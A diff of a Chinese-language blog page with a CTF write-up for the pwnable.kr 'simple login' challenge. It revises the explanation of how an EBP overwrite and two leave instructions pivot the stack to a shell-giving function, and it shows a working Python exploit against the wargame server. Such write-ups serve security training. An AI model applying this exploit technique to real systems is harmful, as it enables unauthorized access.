@@ -87,8 +87,7 @@
 <meta name="description" content="Trick
 输入payload后可以直接通过gdb的searchmem工具查找输入的字符串存放在内存的位置
 
-Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样就可以通过控制EBP的值来转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell
-Expl">
+Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样，只要经历两次leave指令，就可以转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.kr-rookiss-simple-login">
 <meta property="og:url" content="http://0byjwzsf.me/2016/07/26/pwnable-rookiss-simple-login/index.html">
@@ -96,16 +95,14 @@ Expl">
 <meta property="og:description" content="Trick
 输入payload后可以直接通过gdb的searchmem工具查找输入的字符串存放在内存的位置
 
-Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样就可以通过控制EBP的值来转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell
-Expl">
-<meta property="og:updated_time" content="2016-09-02T16:01:14.000Z">
+Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样，只要经历两次leave指令，就可以转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell">
+<meta property="og:updated_time" content="2016-09-02T16:16:53.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.kr-rookiss-simple-login">
 <meta name="twitter:description" content="Trick
 输入payload后可以直接通过gdb的searchmem工具查找输入的字符串存放在内存的位置
 
-Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样就可以通过控制EBP的值来转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell
-Expl">
+Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样，只要经历两次leave指令，就可以转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell">
 
 
 
@@ -377,7 +374,7 @@ Expl">
         <h2 id="Trick">Trick</h2><ul>
 <li>输入payload后可以直接通过gdb的<code>searchmem</code>工具查找输入的字符串存放在内存的位置</li>
 </ul>
-<h2 id="Conclusion">Conclusion</h2><p>解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的<code>EBP</code>，这样就可以通过控制<code>EBP</code>的值来转移<code>ESP</code>到数据段上的payload处，之后的<code>ret</code>指令会跳转到payload上的地址，即我们已经构造好的<code>correct</code>函数的地址，从而拿到shell</p>
+<h2 id="Conclusion">Conclusion</h2><p>解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的<code>EBP</code>，这样，只要经历两次<code>leave</code>指令，就可以转移<code>ESP</code>到数据段上的payload处，之后的<code>ret</code>指令会跳转到payload上的地址，即我们已经构造好的<code>correct</code>函数的地址，从而拿到shell</p>
 <h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'AAAA'</span></span><br><span class="line">payload +=  l32(<span class="number">0x08049284</span>)</span><br><span class="line">payload +=  l32(<span class="number">0x0811eb40</span>)  </span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Authenticate :'</span>)</span><br><span class="line">io.writeline(b64encode(payload))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 
       
